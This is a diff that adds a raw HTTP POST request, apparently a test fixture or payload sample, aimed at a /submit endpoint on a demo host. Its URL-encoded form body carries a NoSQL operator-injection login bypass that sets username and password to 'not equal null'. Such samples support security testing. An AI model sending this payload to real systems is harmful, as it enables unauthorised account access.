@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+Connection: close
+
+file=%7B%22username%22%3A%7B%22%24ne%22%3Anull%7D%2C%22password%22%3A%7B%22%24ne%22%3Anull%7D%7D
